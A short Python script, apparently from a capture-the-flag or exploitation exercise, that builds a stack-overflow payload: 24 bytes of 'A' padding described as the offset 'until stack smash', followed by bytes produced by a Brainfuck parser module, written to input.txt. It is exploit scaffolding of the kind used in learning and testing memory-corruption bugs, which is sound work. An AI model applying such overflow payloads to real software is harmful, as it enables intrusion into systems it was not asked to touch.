from bf_parser import *

p = BF_Parser("+")

offset = b"A" * 24 # offset until stack smash ; added for debugging
payload = offset + p.parse()

num_bytes = len(payload)

print(f"The payload has {num_bytes} bytes and can be found in the input.txt file")
# print(payload)

with open("input.txt", "wb") as fout:
    fout.write(payload)